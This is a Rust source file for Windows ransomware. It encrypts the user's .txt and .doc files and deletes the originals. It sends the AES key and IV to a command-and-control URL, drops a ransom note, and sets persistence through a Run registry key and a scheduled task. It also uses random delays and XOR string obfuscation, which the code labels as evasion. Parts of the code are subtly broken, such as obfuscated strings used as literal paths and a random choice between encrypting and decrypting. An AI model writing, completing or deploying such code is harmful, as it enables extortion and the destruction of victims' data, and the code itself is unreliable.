extern crate aes;
extern crate rand;
extern crate reqwest;
extern crate walkdir;
extern crate base64;

use aes::Aes256;
use aes::cipher::{NewCipher, StreamCipher};
use aes::cipher::generic_array::GenericArray;
use rand::Rng;
use reqwest::blocking::Client;
use reqwest::header::USER_AGENT;
use walkdir::WalkDir;
use std::fs::{File, remove_file};
use std::io::{Read, Write};
use std::path::Path;
use std::thread;
use std::time::{Duration};
use std::ffi::CString;
use std::os::windows::ffi::OsStringExt;
use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW};
use winapi::um::winnt::{KEY_WRITE, REG_SZ};
use std::ptr;
use std::process::Command;
use std::mem;

// Constants for encryption
const BUFFER_SIZE: usize = 1024;

// XOR encryption for string obfuscation
fn xor_string(data: &str, key: u8) -> String {
    data.bytes().map(|b| (b ^ key) as char).collect()
}

// Generate random AES key and IV
fn generate_key() -> (Vec<u8>, Vec<u8>) {
    let key: Vec<u8> = (0..32).map(|_| rand::thread_rng().gen::<u8>()).collect();
    let iv: Vec<u8> = (0..16).map(|_| rand::thread_rng().gen::<u8>()).collect();
    (key, iv)
}

// Send key to C2 server
fn send_key_to_c2(key: &[u8], iv: &[u8]) {
    let client = Client::new();
    let url = "https://yourc2server.com/receive_key";

    let data = serde_json::json!({
        "key": base64::encode(key),
        "iv": base64::encode(iv)
    });

    let _res = client.post(url)
        .header(USER_AGENT, "MyRansomware")
        .json(&data)
        .send()
        .expect("Failed to send data to C2");
}

// Save key (for debugging, remove in production)
fn save_key(key: &[u8], iv: &[u8]) {
    let file_name = xor_string("secret.key", 42);
    let mut key_file = File::create(&file_name).expect("Unable to create key file");
    key_file.write_all(key).expect("Unable to write key");
    key_file.write_all(iv).expect("Unable to write IV");
}

// Add registry entry for persistence
fn add_to_registry() {
    unsafe {
        let hkey = winapi::um::winreg::HKEY_LOCAL_MACHINE;
        let subkey = CString::new(r"Software\Microsoft\Windows\CurrentVersion\Run").unwrap();
        let app_name = CString::new("MyRansomware").unwrap();
        let app_path = CString::new(r"C:\path\to\your\ransomware.exe").unwrap();

        let mut hkey_result = ptr::null_mut();
        RegCreateKeyExW(hkey, subkey.as_ptr(), 0, ptr::null_mut(), 0, KEY_WRITE, ptr::null_mut(), &mut hkey_result, ptr::null_mut());
        RegSetValueExW(hkey_result, app_name.as_ptr(), 0, REG_SZ, app_path.as_ptr() as *const u8, app_path.to_bytes().len() as u32);
    }
}

// Create scheduled task for persistence
fn create_task() {
    Command::new("schtasks")
        .arg("/create")
        .arg("/tn")
        .arg("MyRansomware")
        .arg("/tr")
        .arg(r"C:\path\to\your\ransomware.exe")
        .arg("/sc")
        .arg("onstart")
        .output()
        .expect("Failed to create scheduled task");
}

// Encrypt file using AES encryption
fn encrypt_file(file: &Path, key: &[u8], iv: &[u8]) {
    let mut input_file = File::open(file).expect("Unable to open file");
    let mut output_file = File::create("temp.enc").expect("Unable to create file");

    let mut buffer = vec![0u8; BUFFER_SIZE];
    while let Ok(bytes_read) = input_file.read(&mut buffer) {
        if bytes_read == 0 {
            break;
        }

        // Dynamic AES encryption
        dynamic_encrypt(&mut buffer, key, iv);
        output_file.write_all(&buffer[..bytes_read]).expect("Error writing to file");
        delay_execution();  // Random delay for evasion
    }

    remove_file(file).expect("Unable to remove original file");
    std::fs::rename("temp.enc", file).expect("Unable to rename file");
}

// Decrypt file (if needed for reverse action)
fn decrypt_file(file: &Path, key: &[u8], iv: &[u8]) {
    let mut input_file = File::open(file).expect("Unable to open file");
    let mut output_file = File::create("temp.dec").expect("Unable to create file");

    let mut buffer = vec![0u8; BUFFER_SIZE];
    while let Ok(bytes_read) = input_file.read(&mut buffer) {
        if bytes_read == 0 {
            break;
        }

        // Dynamic AES decryption
        dynamic_decrypt(&mut buffer, key, iv);
        output_file.write_all(&buffer[..bytes_read]).expect("Error writing to file");
        delay_execution();  // Random delay for evasion
    }

    remove_file(file).expect("Unable to remove original file");
    std::fs::rename("temp.dec", file).expect("Unable to rename file");
}

// Function to simulate ransomware processing on files in directory
fn process_directory(op: fn(&Path, &[u8], &[u8]), folder: &str, key: &[u8], iv: &[u8]) {
    for entry in WalkDir::new(folder).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            let path = entry.path();
            if path.extension().map_or(false, |ext| ext == xor_string("txt", 42) || ext == xor_string("doc", 42)) {
                op(path, key, iv);
                println!("Processed {:?}", path);
            }
        }
    }
}

// Function to encrypt all files in the directory
fn encrypt_directory(folder: &str, key: &[u8], iv: &[u8]) {
    process_directory(encrypt_file, folder, key, iv);
}

// Function to decrypt all files in the directory
fn decrypt_directory(folder: &str, key: &[u8], iv: &[u8]) {
    process_directory(decrypt_file, folder, key, iv);
}

// Create a ransom note
fn create_ransom_note() {
    let mut note_file = File::create("C:\\Users\\YourUser\\ransom_note.txt").expect("Unable to create ransom note");
    let note_content = xor_string("Your files have been encrypted!", 42);
    writeln!(note_file, "{}", note_content).expect("Error writing ransom note");
}

// Random delay to avoid static detection
fn delay_execution() {
    let delay_time = rand::thread_rng().gen_range(2..5);  // Randomized delay
    thread::sleep(Duration::from_secs(delay_time));
}

// Main function where everything is initialized
fn main() {
    let folder_path = xor_string("C:\\Users\\YourUser", 42);

    let (key, iv) = generate_key();
    send_key_to_c2(&key, &iv);  // Send key to C2 immediately
    save_key(&key, &iv);  // Optionally save key for later retrieval

    let random_action: u8 = rand::thread_rng().gen();
    if random_action % 2 == 0 {
        println!("Encrypting files...");
        encrypt_directory(&folder_path, &key, &iv);
    } else {
        println!("Decrypting files...");
        decrypt_directory(&folder_path, &key, &iv);
    }

    create_ransom_note();
    add_to_registry();  // Ensure persistence
    create_task();  // Add to scheduled tasks for restart persistence

    remove_file(&xor_string("secret.key", 42)).expect("Unable to remove key file");
    println!("Ransom note created. Key removed.");
}

